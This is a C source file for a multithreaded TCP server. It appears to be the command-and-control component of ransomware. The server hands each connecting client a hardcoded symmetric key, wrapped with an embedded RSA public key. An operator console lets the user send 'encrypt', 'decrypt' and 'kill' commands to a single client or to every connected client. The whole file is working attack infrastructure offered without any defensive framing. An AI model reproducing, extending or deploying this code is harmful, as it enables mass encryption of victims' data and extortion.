#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <sys/socket.h>
#include <unistd.h>
#include <pthread.h>

#include "../../server_headers/serverThread.h"
#include "../../server_headers/server_global.h"
#include "../../server_headers/encrypt_key.h"

#define PORT 8080
const unsigned char *KEY = (const unsigned char *)"qwertyuiopasdfgh";
const char *PUBKEY = 
"-----BEGIN PUBLIC KEY-----\n"
"MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAyWj/4+1O3+ne6GGtgBEO\n"
"LbiMFm4KaYnhFahB/2v0tVhnlBp8j0N13TVOQsH3hTiN3O0M+p7g36Pgt4evOeg9\n"
"Ras0ZPqprTRwwuvWu/cEqTkuFStRCQ3y+9GTwhvuRpY1ddZ+15QOoEdIs+MP0n4i\n"
"ZkeFcvmx5U6cqypJBeIC3ISG+QIDfzBh4TEEZqkokAo2isHlnzhnpNfLH2fIeARw\n"
"xHv4eKabvjAmbYzeKt8uZO+tTOBPiv2uWi6vDqLndc1C2p5/m3zBhF962cgrmIbo\n"
"AgMn07/PVCQh3ANOwoGDmO2zMpnU+CH9XUGbIj5yNbi4molNiMzCPz5mUbDTB8jt\n"
"HwIDAQAB\n"
"-----END PUBLIC KEY-----\n";

struct sockaddr_in address;
socklen_t addrlen = sizeof(address);

void get_list() {
    Node *curr = socket_queue.head;
    while (curr != NULL) {
        printf("socket_id : %d\n",curr->socketfd);
        curr = curr->next;
    }
}

void *connection_listener(void *arg) {
    int server_socket = *(int *)arg;
    free(arg);

    while (true) {
        printf("waiting for connection\n");
        int new_socket = accept(server_socket, (struct sockaddr*) &address, &addrlen);
        if (new_socket >= 0) {
            printf("client connected: %d\n", new_socket);
            enqueue(&socket_queue, new_socket);

            int *client_socket = malloc(sizeof(int));
            *client_socket = new_socket;

            pthread_t msg_thread;
            pthread_create(&msg_thread, NULL, handle_receive_message, client_socket);//one thread per client
            pthread_detach(msg_thread);


            unsigned char encrypted[256];
            size_t enc_len = sizeof(encrypted);

            int result = encrypt_key(KEY, 16, PUBKEY, encrypted, &enc_len);
            if (result < 0) {
                printf("encryption failed\n");
                return 0;
            }      
            send(new_socket, encrypted, enc_len, 0);
        } else {
            perror("accept");
        }
    }
    return NULL;
}

void *commands_listener(void *arg) {
    char command[1024];
    while (true) {
        fgets(command, sizeof(command), stdin);

        char *arguments[10] = {0};
        int i = 0;

        char *token = strtok(command, ";");

        while (token != NULL) {
            arguments[i] = token;
            i++;
            token = strtok(NULL, ";\n");
        }

        if (strcmp(arguments[0], "list") == 0) {
            get_list();
        } else if (strcmp(arguments[0], "encrypt") == 0) {
            if (arguments[1] == NULL) {
                printf("!!! Use encrypt;client_socket or all\n");
            } else if (strcmp(arguments[1], "all") == 0) {
                Node *curr = socket_queue.head;
                while (curr != NULL) {
                    send(curr->socketfd, command, strlen(command), 0);
                    curr = curr->next;
                }
            } else {
                int fd = atoi(arguments[1]);
                int send_value = send(fd, command, strlen(command), 0);
                if (send_value == -1) {
                    printf("client_socket not existing\n");
                }
            }
        } else if (strcmp(arguments[0], "decrypt") == 0) {
            if (arguments[1] == NULL) {
                printf("!!! Use decrypt;client_socket or all\n");
            } else if (strcmp(arguments[1], "all") == 0) {
                Node *curr = socket_queue.head;
                while (curr != NULL) {
                    send(curr->socketfd, command, strlen(command), 0);
                    curr = curr->next;
                }
            } else {
                int fd = atoi(arguments[1]);
                int send_value = send(fd, command, strlen(command), 0);
                if (send_value == -1) {
                    printf("client_socket not existing\n");
                }
            }
        } else if (strcmp(arguments[0], "kill") == 0) {
            if (arguments[1] == NULL) {
                printf("Use kill;client_socket\n");
            } else if (strcmp(arguments[1], "all") == 0) {
                Node *curr = socket_queue.head;
                while (curr != NULL) {
                    send(curr->socketfd, command, strlen(command), 0);
                    curr = curr->next;
                }
            } else {
                int fd = atoi(arguments[1]);
                int send_value = send(fd, command, strlen(command), 0);
                if (send_value == -1) {
                    printf("client_socket not existing\n");
                }
            }
        } else {
            Node *curr = socket_queue.head;
            while (curr != NULL) {
                send(curr->socketfd, command, strlen(command), 0);
                curr = curr->next;
            }
        }
    } 
}

int main(int argc, char const* argv[]) {
    int serverfd = socket(AF_INET, SOCK_STREAM, 0);
    if (serverfd < 0) {
        perror("socket");
        return 1;
    }

    int opt = 1;
    setsockopt(serverfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(PORT);

    if (bind(serverfd, (struct sockaddr*)&address, sizeof(address)) < 0) {
        perror("bind");
        return 1;
    }

    if (listen(serverfd, 3) < 0) {
        perror("listen");
        return 1;
    }

    initializeQueue(&socket_queue);

    int *server_socket = malloc(sizeof(int));
    *server_socket = serverfd;

    pthread_t connection_tid, command_tid;

    pthread_create(&connection_tid, NULL, connection_listener, server_socket);
    pthread_create(&command_tid, NULL, commands_listener, NULL);

    pthread_join(connection_tid, NULL);
    pthread_join(command_tid, NULL);

    close(serverfd);
    return 0;   
}